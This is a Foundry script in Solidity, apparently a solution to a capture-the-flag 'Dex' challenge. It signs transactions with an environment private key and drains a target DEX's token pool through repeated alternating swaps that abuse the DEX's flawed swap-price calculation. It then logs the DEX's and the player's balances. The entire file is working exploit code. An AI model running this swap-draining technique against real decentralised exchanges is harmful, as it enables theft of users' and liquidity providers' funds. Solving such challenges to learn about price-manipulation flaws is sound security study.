// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Instances/DEX.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract Exploit is Script {
    Dex public target = Dex(0x2542FAA430f708345B57f167b77D3Af1f3586b23);
    address public token1 = target.token1();
    address public token2 = target.token2();
    
    function attack(uint256 i) internal {
        target.approve(address(target), i);
        target.swap(token1, token2, i);
        target.swap(token2, token1, i);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint balance1 = target.balanceOf(token1, address(target));
        uint balance2 = target.balanceOf(token2, address(target));
        console.log("token1: ", token1);
        console.log("token2: ", token2);
        console.log("balance1: ", balance1);
        console.log("balance2: ", balance2);

        for (uint i=0; i<9; i++){
            attack(10 + i*2);
        }

        attack(21);
        
        target.approve(address(target), 3);
        target.swap(token2, token1, 3);
        target.swap(token1, token2, 3);
        
        balance1 = target.balanceOf(token1, address(target));
        uint balance11 = target.balanceOf(token1, vm.envAddress("MY_ADDRESS"));
        balance2 = target.balanceOf(token2, address(target));
        uint balance12 = target.balanceOf(token2, vm.envAddress("MY_ADDRESS"));
        console.log("DEX token1: ", balance1);
        console.log("DEX token2: ", balance2);
        console.log("player token1: ", balance11);
        console.log("player token2: ", balance12);
        vm.stopBroadcast(); 
    }

}